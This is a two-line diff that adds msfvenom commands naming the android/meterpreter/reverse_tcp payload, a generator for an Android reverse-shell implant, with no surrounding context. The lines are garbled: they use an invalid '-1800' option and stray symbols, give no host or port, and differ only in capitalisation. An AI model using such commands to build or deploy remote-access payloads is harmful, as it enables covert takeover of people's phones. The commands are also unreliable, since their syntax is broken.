@@ -1,0 +1,2 @@
+msfvenom -1800 ⟨R⟩ ⟨®⟩ android/meterpreter/reverse_tcp
+msfvenom -1800 ⟨R⟩ ⟨®⟩ android/Meterpreter/reverse_tcp
